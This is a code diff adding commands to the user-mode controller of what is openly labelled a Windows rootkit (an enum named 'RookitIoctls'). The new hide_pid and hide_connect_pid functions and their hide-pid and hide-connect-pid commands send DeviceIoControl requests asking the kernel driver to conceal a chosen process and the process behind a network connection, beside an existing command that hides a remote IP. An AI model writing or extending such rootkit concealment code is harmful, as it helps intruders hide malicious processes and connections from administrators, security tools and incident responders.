@@ -141,6 +141,57 @@ BOOL Driver::DriverHandler::hide_remote_ip(const char* message)
 	return bRet;
 }
 
+
+BOOL Driver::DriverHandler::hide_connect_pid(const char* message)
+{
+	USHORT pid_number{ 0 };
+	std::stringstream ss(message);
+	if (ss >> pid_number)
+	{
+		char* pid = const_cast<char*>(message);
+		DWORD BytesReturned{ 0 };
+
+		BOOL bRet = DeviceIoControl(
+			device_handle_,
+			static_cast<DWORD>(Driver::RookitIoctls::HideConnectProcessId),
+			pid,
+			(DWORD)strlen(pid),
+			nullptr,
+			0,
+			&BytesReturned,
+			nullptr
+		);
+		return bRet;
+	}
+	logError("PID  is not a valid Integer type");
+	return FALSE;
+}
+
+BOOL Driver::DriverHandler::hide_pid(const char* message)
+{
+	USHORT pid_number{ 0 };
+	std::stringstream ss(message);
+	if (ss >> pid_number)
+	{
+		char* pid = const_cast<char*>(message);
+		DWORD BytesReturned{ 0 };
+
+		BOOL bRet = DeviceIoControl(
+			device_handle_,
+			static_cast<DWORD>(Driver::RookitIoctls::HideProcessId),
+			pid,
+			(DWORD)strlen(pid),
+			nullptr,
+			0,
+			&BytesReturned,
+			nullptr
+		);
+		return bRet;
+	}
+	logError("PID  is not a valid Integer type");
+	return FALSE;
+}
+
 HANDLE Driver::DriverHandler::device_handle()
 {
 	return device_handle_;
@@ -222,6 +273,44 @@ int Driver::DriverHandler::CmdNetHideRemoteIp(int argc, const char** argv)
 	else
 	{
 		logInfo("Remote IP Hidden!");
+	}
+	return 0;
+}
+
+int Driver::DriverHandler::CmdNetHideConnectPID(int argc, const char** argv)
+{
+	if (argc < 3)
+	{
+		logError("Missing Parameters For hide-connect-pid (<pid>)\n");
+	}
+
+	const char* connect_pid = argv[2];
+	if ((connect_pid != nullptr) && (!hide_connect_pid(connect_pid)))
+	{
+		logError("Couldn't hide Connect PID");
+	}
+	else
+	{
+		logInfo("Connect PID is Hidden!");
+	}
+	return 0;
+}
+
+int Driver::DriverHandler::CmdNetHidePID(int argc, const char** argv)
+{
+	if (argc < 3)
+	{
+		logError("Missing Parameters For hide-pid (<pid>)\n");
+	}
+
+	const char* pid = argv[2];
+	if ((pid != nullptr) && (!hide_pid(pid)))
+	{
+		logError("Couldn't hide PID");
+	}
+	else
+	{
+		logInfo("PID is Hidden!");
 	}
 	return 0;
 }
